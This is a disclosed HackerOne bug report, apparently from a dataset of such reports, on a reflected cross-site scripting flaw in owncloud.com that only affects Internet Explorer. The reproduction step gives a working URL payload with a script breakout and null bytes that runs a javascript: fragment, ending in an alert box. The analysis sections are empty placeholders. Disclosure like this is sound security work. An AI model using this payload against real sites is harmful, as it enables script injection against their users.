---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '127259'
original_report_id: '127259'
title: Reflected XSS in owncloud.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: owncloud
created_at: '2016-04-01T06:51:30.860Z'
disclosed_at: '2016-04-01T10:23:16.511Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS in owncloud.com

## Metadata

- HackerOne Report ID: 127259
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: owncloud
- Disclosed At: 2016-04-01T10:23:16.511Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

xss does work only for inetrnet explorer, for all versions

how to reproduce? :

1. to use internet explorer browser(i have test with ie11)
2.  go to page
https://owncloud.com/wp-123.php?action[][]=</form></div></script><script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.domain)

3. will be alert box with name of domain

please look at my poc video in attachment

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
